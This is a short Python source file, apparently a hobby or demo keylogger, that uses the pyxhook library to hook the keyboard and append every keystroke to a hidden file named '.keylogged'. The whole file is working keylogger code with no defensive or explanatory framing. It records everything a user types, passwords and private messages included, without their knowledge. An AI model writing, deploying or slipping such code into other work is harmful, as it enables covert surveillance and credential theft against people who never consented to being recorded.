from pyxhook import HookManager

class Keylogger:

 def __init__(self):
  self.klg = HookManager()
  self.klg.KeyDown = self.listening
  self.klg.HookKeyboard()
  self.klg.start()

 def listening(self, event):
  k = event.Key

  if k == "space": k = " "
   
  with open('.keylogged', 'a+') as keylogging:
    keylogging.write('%s\n' % k)  

new = Keylogger()
